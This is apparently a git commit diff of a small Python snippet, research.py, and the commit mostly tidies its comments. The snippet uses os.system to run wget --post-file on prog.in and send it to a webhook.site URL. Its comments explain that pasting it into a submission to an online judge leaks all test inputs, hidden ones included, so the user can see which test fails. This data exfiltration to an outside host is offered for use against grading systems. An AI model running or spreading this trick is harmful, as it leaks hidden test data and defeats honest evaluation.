961b2f2dac2a9f4bb7be6d12c5d5bcf1990c8e1f
ghh-jb <138157456+ghh-jb@users.noreply.github.com>
2024-08-29 07:35:52 +0300

    Clean up. No correct output as well.

--- research.py
+++ research.py
@@ -1,8 +1,9 @@
-#add this in the beginnning of your problem and you will see, on what input it fails
-# =======
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
 import os
-url = "https://" # here MUST be your UNIQUE url from webhook.site 
-
-os.system(f"wget -q --post-file prog.in {url}") # Here it send http request using Post-request of file with tests (prog.in file) to webhook so in body of http request we will have tests(all including hidden)
-# last test will be the test which fails or the last test if everything is correct
-# =======
+url = "https://" 
+os.system(f"wget -q --post-file prog.in {url}")
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
+### add this in the beginnning of your problem and you will see, on what input it fails
+### At url = MUST be your UNIQUE url from webhook.site 
+### Next it send http request using Post-request of file with tests (prog.in file) to webhook so in body of http request we will have tests(all including hidden)
+### last test will be the test which fails or the last test if everything is correct.
